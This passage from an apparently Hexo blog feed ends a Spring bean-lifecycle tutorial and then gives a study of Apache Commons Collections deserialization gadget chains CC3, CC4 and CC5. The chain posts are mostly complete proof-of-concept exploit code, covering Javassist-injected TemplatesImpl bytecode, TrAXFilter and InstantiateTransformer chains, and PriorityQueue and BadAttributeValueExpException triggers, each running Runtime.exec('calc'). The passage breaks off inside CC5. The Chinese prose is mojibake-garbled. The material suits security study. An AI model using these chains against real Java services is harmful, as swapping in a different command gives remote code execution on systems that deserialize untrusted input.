class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line"><span class="type">TestBean</span> <span class="variable">testBean</span> <span class="operator">=</span> (TestBean) context.getBean(<span class="string">&quot;testBean&quot;</span>);</span><br></pre></td></tr></table></figure><p>äºŒè€…æ²¡æœ‰æœ¬è´¨åŒºåˆ«ï¼Œå› ä¸º<code>ApplicationContext</code>å®ç°äº†<code>ListableBeanFactory</code>æ¥å£ï¼Œè€Œ<code>ListableBeanFactory</code>æ˜¯<code>BeanFactory</code>çš„å­æ¥å£</p><h3 id="beançš„é”€æ¯"><a href="#beançš„é”€æ¯" class="headerlink" title="beançš„é”€æ¯"></a>beançš„é”€æ¯</h3><p>ä¸ºbeanå¯¹è±¡åˆ›å»ºé”€æ¯æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šé”€æ¯æ–¹æ³•</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;testBean&quot;</span> <span class="attr">class</span>=<span class="string">&quot;Bean.Test&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;destroy&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>AbstractApplicationContext</code>çš„<code>close()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractApplicationContext applicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXm1ApplicationContext</span>(<span class="string">&quot;spring.xml&quot;</span>);</span><br><span class="line">applicationContext.close();</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šæ‰“å°<code>destroy...</code></p><br/>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollectionsååºåˆ—åŒ–é“¾å˜ç§</title>
      <link href="/2025/12/25/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%8F%98%E7%A7%8D/"/>
      <url>/2025/12/25/CommonsCollections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%8F%98%E7%A7%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollectionsååºåˆ—åŒ–é“¾å˜ç§"><a href="#CommonsCollectionsååºåˆ—åŒ–é“¾å˜ç§" class="headerlink" title="CommonsCollectionsååºåˆ—åŒ–é“¾å˜ç§"></a>CommonsCollectionsååºåˆ—åŒ–é“¾å˜ç§</h1><p>å‰©ä¸‹éƒ¨åˆ†CCé“¾å¹¶æ²¡æœ‰å¼•ç”¨Javaçš„æ–°ç‰¹æ€§ï¼Œåé¢å‡ ä¸ªå‡ ä¹å°±æ˜¯åœ¨æ’åˆ—ç»„åˆäº†ï¼Œå¯¹äºè¿™äº›æ²¡æœ‰å¤ªå¤§æ„é€ éš¾åº¦çš„é“¾æˆ‘é€‰æ‹©åˆå¹¶è®°å½•</p><br/><h2 id="CommonsCollections3ååºåˆ—åŒ–é“¾"><a href="#CommonsCollections3ååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsCollections3ååºåˆ—åŒ–é“¾"></a>CommonsCollections3ååºåˆ—åŒ–é“¾</h2><p>è¯¥é“¾ä½¿ç”¨äº†<code>ChainedTransformer</code> çš„é“¾å¼è°ƒç”¨å’Œ<code>LazyMap</code>ä¾èµ–çš„åŠ¨æ€ä»£ç†ï¼Œå¤ç°çš„jdkç‰ˆæœ¬éœ€è¦ä½äº1.8.0_71</p><p>CC3é“¾åŒæ ·åˆ©ç”¨äº†åŠ¨æ€åŠ è½½æ¶æ„ç±»å®ç°å‘½ä»¤æ‰§è¡Œï¼Œä¸CC2é“¾ä¸åŒçš„ç‚¹åœ¨äºCC3åŠ è½½æ¶æ„ç±»è½½ä½“<code>templatesTmpl</code>çš„ä½ç½®åœ¨<code>TrAXFilter</code>ç±»çš„æ„é€ å™¨ä¸­ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>newTransformer()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œå®ä¾‹åŒ–<code>templatesTmpl</code>çš„ä½ç‚¹åˆ™ä½¿ç”¨äº†<code>InstantiateTransformer</code>ç±»çš„<code>transform()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯å‡ºæ¥äº†ï¼Œå…ˆè·å–<code>TrAXFilter</code>ç±»çš„æ„é€ å™¨ï¼Œå†æŠŠ<code>templatesTmpl</code>ä¼ å…¥ä½œä¸ºå‚æ•°ï¼Œä¸ºäº†è¾¾æˆè¿™ä¸€ç›®çš„ï¼Œéœ€è¦ä½¿ç”¨<code>ChainedTransformed</code>çš„é“¾å¼è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesTmpl&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åé¢åˆ™æ˜¯LazyMapçš„è·¯å¾„äº†ï¼Œå¦‚æ­¤æ•´æ¡é“¾å·²ç»å®Œæˆ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TrAXFilter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytecode = test.toBytecode();</span><br><span class="line">        </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templatesImpl.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">Constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) Constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Map&lt;?,?&gt; proxyMap =(Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, annotationInvocationHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler2</span> <span class="operator">=</span> (InvocationHandler) Constructor.newInstance(Override.class,proxyMap);</span><br><span class="line">        </span><br><span class="line">        serialize(annotationInvocationHandler2);</span><br><span class="line">        unserialize(<span class="string">&quot;cc3.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections4ååºåˆ—åŒ–é“¾"><a href="#CommonsCollections4ååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsCollections4ååºåˆ—åŒ–é“¾"></a>CommonsCollections4ååºåˆ—åŒ–é“¾</h2><p>CC4é“¾ä¸CC3åŒæ ·ä½¿ç”¨<code>TrAXFilter</code>å»è§¦å‘<code>newTransformer()</code>æ–¹æ³•ï¼Œä¸åŒä¹‹å¤„åœ¨äºè¯¥é“¾çš„èµ·ç‚¹æ˜¯<code>PriorityQueue</code>ï¼Œå‰åŠæ®µä¸CC2å¤§ä½“ç›¸åŒï¼Œä½†æ˜¯ç”±äºä¸ç›´æ¥ä½¿ç”¨<code>invokerTransformer</code>å»è°ƒç”¨<code>newTransformer()</code>ï¼Œ<code>queue[]</code>æ•°ç»„å†…å¯ä»¥æ˜¯ä»»æ„å€¼</p><p><code>PriorityQueue</code>çš„æ„å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"><span class="type">Class</span> <span class="variable">priorityQueueClass</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;anything&quot;</span>,<span class="string">&quot;anything&quot;</span>&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>ä¸CC3çš„ååŠæ®µç»“åˆå°±æ˜¯å®Œæ•´çš„é“¾äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytecode = test.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">priorityQueueClass</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;anything&quot;</span>,<span class="string">&quot;anything&quot;</span>&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc3.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections5ååºåˆ—åŒ–é“¾"><a href="#CommonsCollections5ååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsCollections5ååºåˆ—åŒ–é“¾"></a>CommonsCollections5ååºåˆ—åŒ–é“¾</h2><p>CC5é“¾çš„ååŠæ®µä¸CC1ç±»ä¼¼ï¼Œä½¿ç”¨<code>ChainedTransformer</code>å’Œ<code>LazyMap</code>ï¼Œä¸åŒä¹‹å¤„åœ¨äºè§¦å‘<code>get()</code>æ–¹æ³•çš„ä¸Šå±‚æ˜¯<code>TiedMapEntry</code>ç±»çš„<code>getValue()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¾€ä¸ŠæŸ¥æ‰¾å‘ç°åŒç±»çš„<code>toString()</code>è°ƒç”¨<code>getValue()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•çš„ä¸Šå±‚æ˜¯<code>BadAttributeValueExpException</code>çš„<code>readObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æƒ³åŠæ³•è®©<code>BadAttributeValueExpException</code>çš„<code>val</code>ä¸º<code>TiedMapEntry</code>çš„å¯¹è±¡å°±å¥½äº†ï¼Œåœ¨æ„é€ å™¨ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å¦‚æœç›´æ¥ç”¨æ„é€ å™¨èµ‹å€¼ï¼Œä¼šç›´æ¥åœ¨å®ä¾‹åŒ–é˜¶æ®µæŠŠ<code>val</code>èµ‹å€¼ä¸º<code>TiedMapEntry.toString()</code>åçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–æ—¶è¿›å…¥<code>readObject()</code>çš„ç¬¬ä¸€ä¸ªelse ifè€Œä¸æ˜¯é¢„æœŸçš„ç¬¬äºŒä¸ªelse ifï¼Œæ•…åœ¨æ„é€ æ—¶æˆ‘ä»¬éœ€è¦ä¼ å…¥<code>null</code>ï¼Œåé¢å†é€šè¿‡åå°„ç›´æ¥æŠŠ<code>val</code>èµ‹å€¼ä¸º<code>TiedMapEntry</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>å‰é¢å°±æ˜¯CC1çš„ä¸œè¥¿äº†ï¼Œç»„åˆå¾—åˆ°å®Œæ•´é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span>  <span class="operator">=</span> <span class="keyword">new</span> 